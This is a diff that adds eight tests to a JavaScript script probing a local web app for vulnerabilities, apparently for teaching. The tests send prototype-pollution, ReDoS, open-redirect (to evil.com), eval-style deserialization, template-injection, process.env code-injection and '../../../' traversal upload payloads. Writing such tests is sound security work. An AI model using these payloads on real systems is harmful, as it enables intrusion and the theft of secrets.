@@ -316,6 +316,207 @@ async function testXXE() {
   }
 }
 
+// Test 11: Prototype Pollution
+async function testPrototypePollution() {
+  console.log('\n🔧 Testing Prototype Pollution...');
+  
+  try {
+    // Test malicious prototype pollution payload
+    const maliciousConfig = {
+      "__proto__": {
+        "polluted": "vulnerable"
+      },
+      "normalProperty": "normalValue"
+    };
+    
+    const response = await makeRequest('POST', '/merge-config', { config: maliciousConfig });
+    
+    console.log(`Status: ${response.status}`);
+    console.log(`Response: ${JSON.stringify(response.data, null, 2)}`);
+    
+    if (response.status === 200 && response.data.polluted) {
+      console.log('✅ Prototype Pollution vulnerability confirmed!');
+    } else {
+      console.log('❌ Prototype Pollution test failed');
+    }
+  } catch (error) {
+    console.error('❌ Prototype Pollution test error:', error.message);
+  }
+}
+
+// Test 12: Regular Expression DoS (ReDoS)
+async function testReDoS() {
+  console.log('\n⏳ Testing Regular Expression DoS...');
+  
+  try {
+    // Test malicious ReDoS payload
+    const maliciousPattern = '^(a+)+$';
+    const maliciousText = 'a'.repeat(30) + 'b'; // Causes catastrophic backtracking
+    
+    const response = await makeRequest('POST', '/validate-input', { 
+      text: maliciousText, 
+      pattern: maliciousPattern 
+    });
+    
+    console.log(`Status: ${response.status}`);
+    console.log(`Response: ${JSON.stringify(response.data, null, 2)}`);
+    
+    if (response.status === 200 || response.status === 500) {
+      console.log('✅ ReDoS vulnerability confirmed!');
+    } else {
+      console.log('❌ ReDoS test failed');
+    }
+  } catch (error) {
+    console.error('❌ ReDoS test error:', error.message);
+  }
+}
+
+// Test 13: Open Redirect
+async function testOpenRedirect() {
+  console.log('\n🔀 Testing Open Redirect...');
+  
+  try {
+    // Test malicious redirect payload
+    const maliciousUrl = 'https://evil.com/steal-cookies';
+    const response = await makeRequest('GET', `/redirect?url=${encodeURIComponent(maliciousUrl)}`);
+    
+    console.log(`Status: ${response.status}`);
+    console.log(`Response: ${JSON.stringify(response.data, null, 2)}`);
+    
+    if (response.status === 302 || response.status === 301) {
+      console.log('✅ Open Redirect vulnerability confirmed!');
+    } else {
+      console.log('❌ Open Redirect test failed');
+    }
+  } catch (error) {
+    console.error('❌ Open Redirect test error:', error.message);
+  }
+}
+
+// Test 14: Insecure Deserialization
+async function testInsecureDeserialization() {
+  console.log('\n📦 Testing Insecure Deserialization...');
+  
+  try {
+    // Test malicious deserialization payload
+    const maliciousPayload = '(function(){ return "exploited"; })()';
+    
+    const response = await makeRequest('POST', '/deserialize', { 
+      serializedData: maliciousPayload 
+    });
+    
+    console.log(`Status: ${response.status}`);
+    console.log(`Response: ${JSON.stringify(response.data, null, 2)}`);
+    
+    if (response.status === 200 && response.data.data === 'exploited') {
+      console.log('✅ Insecure Deserialization vulnerability confirmed!');
+    } else {
+      console.log('❌ Insecure Deserialization test failed');
+    }
+  } catch (error) {
+    console.error('❌ Insecure Deserialization test error:', error.message);
+  }
+}
+
+// Test 15: Server-Side Template Injection (SSTI)
+async function testSSTI() {
+  console.log('\n🎨 Testing Server-Side Template Injection...');
+  
+  try {
+    // Test malicious SSTI payload
+    const maliciousTemplate = '{{#each this}}{{@key}}: {{this}}{{/each}}';
+    const testData = { name: 'test', secret: 'confidential' };
+    
+    const response = await makeRequest('POST', '/generate-report', { 
+      template: maliciousTemplate,
+      data: testData
+    });
+    
+    console.log(`Status: ${response.status}`);
+    console.log(`Response: ${JSON.stringify(response.data, null, 2)}`);
+    
+    if (response.status === 200 && response.data.report) {
+      console.log('✅ SSTI vulnerability confirmed!');
+    } else {
+      console.log('❌ SSTI test failed');
+    }
+  } catch (error) {
+    console.error('❌ SSTI test error:', error.message);
+  }
+}
+
+// Test 16: Code Injection
+async function testCodeInjection() {
+  console.log('\n💻 Testing Code Injection...');
+  
+  try {
+    // Test malicious code injection payload
+    const maliciousScript = 'process.env';
+    
+    const response = await makeRequest('POST', '/execute-script', { 
+      script: maliciousScript 
+    });
+    
+    console.log(`Status: ${response.status}`);
+    console.log(`Response: ${JSON.stringify(response.data, null, 2)}`);
+    
+    if (response.status === 200 && response.data.result) {
+      console.log('✅ Code Injection vulnerability confirmed!');
+    } else {
+      console.log('❌ Code Injection test failed');
+    }
+  } catch (error) {
+    console.error('❌ Code Injection test error:', error.message);
+  }
+}
+
+// Test 17: Insecure Random Number Generation
+async function testWeakRandomness() {
+  console.log('\n🎲 Testing Weak Random Number Generation...');
+  
+  try {
+    const response = await makeRequest('GET', '/generate-token?length=16');
+    
+    console.log(`Status: ${response.status}`);
+    console.log(`Response: ${JSON.stringify(response.data, null, 2)}`);
+    
+    if (response.status === 200 && response.data.algorithm === 'Math.random()') {
+      console.log('✅ Weak Randomness vulnerability confirmed!');
+    } else {
+      console.log('❌ Weak Randomness test failed');
+    }
+  } catch (error) {
+    console.error('❌ Weak Randomness test error:', error.message);
+  }
+}
+
+// Test 18: Directory Traversal in File Upload
+async function testDirectoryTraversalUpload() {
+  console.log('\n📁 Testing Directory Traversal in Upload...');
+  
+  try {
+    // Test malicious file upload with directory traversal
+    const maliciousFilename = '../../../malicious.txt';
+    const maliciousContent = 'This file was uploaded via directory traversal';
+    
+    const response = await makeRequest('POST', '/upload', { 
+      filename: maliciousFilename,
+      content: maliciousContent
+    });
+    
+    console.log(`Status: ${response.status}`);
+    console.log(`Response: ${JSON.stringify(response.data, null, 2)}`);
+    
+    if (response.status === 200 || response.status === 500) {
+      console.log('✅ Directory Traversal Upload vulnerability confirmed!');
+    } else {
+      console.log('❌ Directory Traversal Upload test failed');
+    }
+  } catch (error) {
+    console.error('❌ Directory Traversal Upload test error:', error.message);
+  }
+}
+
 // Main test runner
 async function runAllTests() {
   console.log('🚀 Starting Vulnerability Tests...');
@@ -333,6 +534,14 @@ async function runAllTests() {
     await testRateLimiting();
     await testLDAPInjection();
     await testXXE();
+    await testPrototypePollution();
+    await testReDoS();
+    await testOpenRedirect();
+    await testInsecureDeserialization();
+    await testSSTI();
+    await testCodeInjection();
+    await testWeakRandomness();
+    await testDirectoryTraversalUpload();
     
     console.log('\n🎯 All vulnerability tests completed!');
     console.log('📚 Review the results above to understand the security issues');
@@ -379,5 +588,13 @@ module.exports = {
   testRateLimiting,
   testLDAPInjection,
   testXXE,
+  testPrototypePollution,
+  testReDoS,
+  testOpenRedirect,
+  testInsecureDeserialization,
+  testSSTI,
+  testCodeInjection,
+  testWeakRandomness,
+  testDirectoryTraversalUpload,
   runAllTests
 };
